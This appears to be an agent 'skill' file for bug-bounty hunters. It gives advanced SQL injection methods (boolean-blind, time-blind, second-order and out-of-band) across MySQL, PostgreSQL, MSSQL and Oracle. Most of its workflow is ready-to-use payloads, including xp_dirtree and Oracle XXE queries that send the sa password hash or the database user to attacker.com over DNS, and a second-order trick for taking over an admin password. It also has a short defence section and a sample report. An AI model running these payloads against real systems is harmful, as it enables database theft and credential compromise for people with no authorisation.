---
name: advanced-sql-injection-sqli
description: >
  Execute advanced SQL Injection attacks to bypass WAFs and extract data from 
  complex architectures. Use this skill for Boolean-Based Blind, Time-Based Blind, 
  Second-Order SQLi, and Out-of-Band (OOB) SQLi across MySQL, PostgreSQL, MSSQL, and Oracle.
domain: cybersecurity
subdomain: bug-hunting
category: Web Vulnerabilities
difficulty: expert
estimated_time: "4-8 hours"
mitre_attack:
  tactics: [TA0001, TA0006]
  techniques: [T1190, T1059]
platforms: [linux, windows]
tags: [sqli, sql-injection, blind-sqli, oob-sqli, second-order-sqli, waf-bypass, owasp-top-10]
tools: [sqlmap, burp-suite]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Advanced SQL Injection (SQLi)

## When to Use
- When basic error-based or UNION-based SQL payloads (`' OR 1=1--`) are filtered or fail to return visible results.
- When attacking modern frameworks where data is stored now but executed in a different query later (Second-Order SQLi).
- To exfiltrate data from heavily firewalled environments via DNS using Out-of-Band (OOB) techniques.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Boolean-Based Blind SQLi

```sql
-- Concept: The application returns NO database errors, and NO queried data. 
-- However, it returns a slightly different HTTP response (e.g., "User exists" vs "User does not exist") 
-- depending on if a trailing SQL condition is TRUE or FALSE.

-- 1. Identify the difference:
-- Payload True: `id=1' AND 1=1--` -> Returns HTTP 200 OK (Content length 500)
-- Payload False: `id=1' AND 1=0--` -> Returns HTTP 404 (Content length 200)

-- 2. Extract data one character at a time (Binary Search / Fuzzing):
-- "Is the first letter of the database name 'a'?"
id=1' AND SUBSTRING(database(),1,1)='a'--

-- Using ASCII conversion to easily script greater/less than checks:
-- "Is the first letter's ASCII value > 100?"
id=1' AND ASCII(SUBSTRING(database(),1,1)) > 100--
-- If the page loads normally (HTTP 200), the answer is YES. If 404, the answer is NO.
```

### Phase 2: Time-Based Blind SQLi

```sql
-- Concept: The application is COMPLETELY blind. It always returns the exact same HTML, 
-- regardless of True or False statements. We force the database to PAUSE execution if a statement is True.

-- 1. PostgreSQL Time Delay Payload:
id=1'; SELECT pg_sleep(10)--
-- If the server takes exactly 10 seconds to respond, it is vulnerable to SQL injection.

-- 2. Extracting data via Time (MySQL example):
-- "If the first letter of the DB is 'A', sleep for 5 seconds. Otherwise, return immediately."
id=1' AND IF(ASCII(SUBSTRING(database(),1,1))=65, SLEEP(5), 0)--

-- Warning: Time-based SQLi is extremely slow and can cause Denial of Service (DoS) 
-- if sleep commands pile up on high-traffic pages. Use carefully.
```

### Phase 3: Out-of-Band (OOB) SQLi via DNS

```sql
-- Concept: The application is blind and asynchronous (time delays don't work or are unreliable).
-- We force the database server itself to make a DNS request to an attacker-controlled server, 
-- placing the stolen data directly inside the subdomain of the DNS query.

-- Prerequisites: Obtain a Burp Collaborator payload or use interactions.sh (e.g., `attacker.com`).

-- 1. MSSQL (Uses xp_dirtree or master..xp_fileexist to initiate SMB/DNS requests):
-- We concatenate the DBA password hash into the URL.
EXEC master..xp_dirtree '\\' + (SELECT master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name='sa') + '.attacker.com\a'

-- 2. Oracle (Uses UTL_HTTP or UTL_INADDR):
SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT user FROM dual)||'.attacker.com/"> %remote;]>'),'/l') FROM dual;

-- The attacker checks their DNS logs and sees a lookup for: 
-- `0x01004086CEB611.attacker.com`. The prefix is the stolen SQL Server password hash.
```

### Phase 4: Second-Order SQLi

```sql
-- Concept: The application securely sanitizes input (e.g., escaping quotes) when WRITING to the DB.
-- However, when the application later READS that data from the DB to build a new query, it trusts it blindly.

-- 1. Injection (Registration Page - Parameterized/Escaped correctly):
-- Username: `admin'--`
-- The backend registers the user. The DB safely holds the literal string: `admin'--`

-- 2. Execution (Password Reset Page - Vulnerable):
-- The user initiates a password reset for their own account (`admin'--`).
-- The backend builds a query assuming DB data is safe: 
-- `UPDATE users SET password='NewPassword' WHERE username='admin'--'`
-- The trailing `--` comments out any safety checks (e.g., `AND tenant_id=5`), resulting in the attacker changing the REAL `admin`'s password.
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Identify Injection Vector] --> B{Does app return DB errors?}
    B -->|Yes| C[Use Error-Based SQLi (e.g., `EXTRACTVALUE`)]
    B -->|No| D{Does app return data from the query?}
    D -->|Yes| E[Use UNION-Based SQLi]
    D -->|No| F{Does HTTP response change on True/False?}
    F -->|Yes| G[Use Boolean-Based Blind SQLi]
    F -->|No| H{Is the server heavily firewalled preventing Outbound?}
    H -->|Yes| I[Use Time-Based Blind SQLi `SLEEP()`]
    H -->|No| J[Use OOB DNS Exfiltration for speed]
```


## 🔵 Blue Team Detection & Defense
- **Parameterized Queries (Prepared Statements)**: The absolute eradication of SQL Injection. Never concatenate user input into SQL syntax Strings. Use parameterized queries (e.g., `PreparedStatement` in Java, PDO in PHP) where the database driver strictly casts variables as strings or integers, preventing them from ever being parsed as executable SQL commands.
- **ORM Strict Usage**: Object-Relational Mappers (Hibernate, EntityFramework, Prisma) naturally prevent most SQL Injection. However, developers must be audited to ensure they do not bypass the ORM to execute raw queries (`.RawQuery()`) manually with concatenated strings.
- **Egress Filtering**: To mitigate Out-of-Band (OOB) SQLi, block all outbound DNS and HTTP requests from the Database Server subnet. Database servers should never be permitted to resolve external internet domains.

## Key Concepts
| Concept | Description |
|---------|-------------|
| Blind SQLi | An attack where the database does not output data to the web page. The attacker must reconstruct the database by asking True/False questions (Boolean) or observing server response times (Time-Based) |
| WAF Evasion | Bypassing Web Application Firewalls using specific encoding, alternative SQL syntax (e.g., replacing spaces with `/**/`), or HTTP Parameter Pollution |
| SQLmap | An open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers |

## Output Format
```
Bug Bounty Report: Time-Based Blind SQLi resulting in DB Dump
=============================================================
Vulnerability: Blind SQL Injection (OWASP A03:2021)
Severity: Critical (CVSS 9.8)
Target: `https://api.company.com/v1/user/search`

Description:
The searching endpoint is vulnerable to Time-Based Blind SQL Injection via the `sort_by` parameter. While standard UNION and Error-based payloads returned generic 500 errors, confirming an anomaly, the injection was confirmed by forcing the PostgreSQL engine to execute a `pg_sleep()` command.

By utilizing a binary search algorithm mapping character ASCII values to sleep conditions, an attacker can extract every table, column, and data row within the database framework without ever triggering a visible error or anomaly on the front end.

Reproduction Steps:
1. Issue a standard HTTP GET request:
   `GET /v1/user/search?sort_by=name` (Response: 100ms)
2. Inject a 5-second sleep payload:
   `GET /v1/user/search?sort_by=name';SELECT pg_sleep(5)--`
3. Observe the server response time precisely matches the injected delay (Response: 5120ms).
4. Extract the first character of the database user mapping to '5':
   `GET /v1/user/search?sort_by=name';SELECT CASE WHEN (ASCII(SUBSTRING(user,1,1))=53) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

Impact:
Total compromise of Data Confidentiality. The entirety of the application's underlying database, including hashed credentials and PII, can be mapped and extracted by an unauthenticated attacker.
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- PortSwigger: [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- OWASP: [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)
- PayloadsAllTheThings: [SQL Injection Methods](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
